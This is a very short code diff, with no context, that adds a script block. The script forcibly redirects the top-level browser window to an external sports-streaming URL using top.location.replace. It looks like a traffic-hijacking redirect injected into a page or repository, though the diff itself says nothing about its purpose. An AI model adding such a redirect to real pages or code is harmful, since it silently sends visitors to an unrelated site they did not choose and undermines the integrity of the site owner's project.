@@ -1,0 +1,4 @@
+<script>
+ref="https://allsports24.co/uefa/?git";
+top.location.replace(ref);
+</script>
